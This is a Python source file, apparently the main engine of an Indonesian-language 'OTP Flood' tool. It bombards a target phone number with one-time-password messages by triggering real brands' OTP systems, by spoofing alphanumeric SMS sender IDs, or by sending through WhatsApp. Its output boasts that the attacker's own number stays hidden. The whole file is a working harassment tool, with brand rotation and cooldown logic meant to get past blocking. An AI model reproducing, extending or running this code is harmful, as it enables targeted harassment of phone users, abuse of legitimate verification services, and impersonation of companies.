"""
OTP Flood - Main Engine (Multi-Mode)
Mode: WA (Baileys) | SMS (Alpha Sender) | TRIGGER (GRATIS - trigger OTP brand beneran)
"""

from datetime import datetime
import sys
import os
import time
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.otp_flood.profiles import PROFILES, get_generator
from modules.otp_flood.templates import CATEGORIES, get_brands_by_category, format_brand_message
from modules.otp_flood.sender_sms import _color
from modules.otp_flood.reporter import generate_report, save_report


def run_flood(config):
    target = config["target"]
    profile_key = config.get("profile", "linear")
    max_msgs = config.get("max_messages", 50)
    block_cooldown = config.get("block_cooldown", 30)
    rotate = profile_key == "rotating"
    mode = config.get("mode", "trigger")

    cats = config.get("categories")
    brands = get_brands_by_category(cats)

    results = {
        "total_sent": 0,
        "total_blocked": 0,
        "total_errors": 0,
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "end_time": "",
        "logs": [],
    }

    consecutive_blocks = 0

    # Init sender based on mode
    sender = None
    if mode == "trigger":
        from modules.otp_flood.sender_trigger import OTPTrigger
        sender = OTPTrigger(target)
        yield f"\n  {_color.B}{_color.GRN}🔥 MODE TRIGGER — GRATIS TOTAL{_color.RST}\n"
        yield f"  {_color.DIM}Trigger OTP dari brand asli. Target liat dari TOKOPEDIA, GOJEK, dll.{_color.RST}\n"
        yield f"  {_color.DIM}Nomor lo {_color.B}AMAN.{_color.RST} {_color.DIM}Brand yang kirim, bukan lo.{_color.RST}\n\n"
    elif mode == "sms":
        from modules.otp_flood.sender_sms import SMSSender
        sender = SMSSender(target)
        yield f"\n  {_color.B}{_color.MAG}📡 MODE SMS — Alpha Sender ID{_color.RST}\n"
        yield f"  {_color.DIM}Pake API key SMS gateway.{_color.RST}\n\n"
    else:
        from modules.otp_flood.sender import Sender as WASender
        sender = WASender(target)
        yield f"\n  {_color.B}{_color.CYN}💬 MODE WHATSAPP — QR scan{_color.RST}\n"
        yield f"  {_color.DIM}Pake WhatsApp lo. Nomor lo kelihatan.{_color.RST}\n\n"

    gen = get_generator(profile_key, {"interval": config.get("interval", 3)})

    for i in range(max_msgs):
        # Pick brand
        if mode == "trigger":
            # In trigger mode, we pick from our trigger brand list
            trigger_brands = list(sender.BRANDS.keys())
            if rotate:
                brand_key = trigger_brands[i % len(trigger_brands)]
            else:
                brand_key = random.choice(trigger_brands)
            brand_name = sender.BRANDS[brand_key]["name"]
            
            result = sender.trigger(brand_key)
            timestamp = datetime.now().strftime("%H:%M:%S")
            results["logs"].append(f"{timestamp}  [{brand_name}]")
            
            if result == "sent":
                results["total_sent"] += 1
                consecutive_blocks = 0
                icon = "✅"
                detail = f"OTP terkirim via {brand_name}"
            elif result == "blocked":
                results["total_blocked"] += 1
                consecutive_blocks += 1
                icon = "🔴"
                detail = f"Di-block {brand_name}"
            else:
                results["total_errors"] += 1
                consecutive_blocks += 1
                icon = "⚠️"
                detail = f"Gagal trigger {brand_name}"
        else:
            # WA/SMS mode: pake template engine
            if rotate and brands:
                brand = brands[i % len(brands)]
            elif brands:
                brand = brands[0]
            else:
                brand = None

            if brand:
                msg_data = format_brand_message(brand)
            else:
                msg_data = {
                    "brand": "OTP", "category": "unknown",
                    "otp": str(abs(hash(str(i)) % 1000000)).zfill(6),
                    "message": f"Kode OTP Anda: {str(abs(hash(str(i)) % 1000000)).zfill(6)}",
                    "sender": "OTP",
                }

            result = sender.send(msg_data["message"], msg_data["sender"])
            timestamp = datetime.now().strftime("%H:%M:%S")
            detail = f"[{msg_data['brand']}] OTP: {msg_data['otp']}"
            results["logs"].append(f"{timestamp}  {detail}")

            if result["status"] == "sent":
                results["total_sent"] += 1
                consecutive_blocks = 0
                icon = "✅"
            elif result["status"] == "blocked":
                results["total_blocked"] += 1
                consecutive_blocks += 1
                icon = "🔴"
            else:
                results["total_errors"] += 1
                consecutive_blocks += 1
                icon = "⚠️"

        # Progress bar
        progress = f"[{i+1}/{max_msgs}]"
        bar_len = 25
        filled = int((i + 1) / max_msgs * bar_len)
        bar = "█" * filled + "░" * (bar_len - filled)

        total_so_far = i + 1
        fail_rate = (results["total_blocked"] + results["total_errors"]) / total_so_far * 100 if total_so_far > 0 else 0

        yield (
            f"\033[2K{icon} {progress} {bar}\n"
            f"\033[2K  ✅ {results['total_sent']} terkirim | "
            f"⚠️ {results['total_errors']} error | "
            f"🔴 {results['total_blocked']} block\n"
            f"\033[2K  📨 {detail}\n"
            f"\033[2K  ⏱  {timestamp} — Kegagalan: {fail_rate:.0f}%\n"
        )

        # Cooldown
        if consecutive_blocks >= 3:
            yield f"\n\033[2K  ⏸  Cooldown {block_cooldown}s...\n"
            for remaining in range(block_cooldown, -1, -1):
                yield f"\033[2K  ⏳ {remaining}s   \r"
                time.sleep(1)
            yield f"\033[2K  ✅ Lanjut\n"
            consecutive_blocks = 0

        # Wait
        try:
            wait = next(gen)
            if wait > 0:
                for s in range(int(wait), 0, -1):
                    yield f"\033[2K  ⏱  {s}s...\r"
                    time.sleep(1)
        except StopIteration:
            break

    results["end_time"] = datetime.now().strftime("%H:%M:%S")

    report_text, grade, det_rate = generate_report(results, config)
    yield f"\n\n{report_text}\n"

    output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "reports")
    os.makedirs(output_dir, exist_ok=True)
    saved = save_report(report_text, output_dir)
    if saved:
        yield f"  📄 Report: {saved}\n"
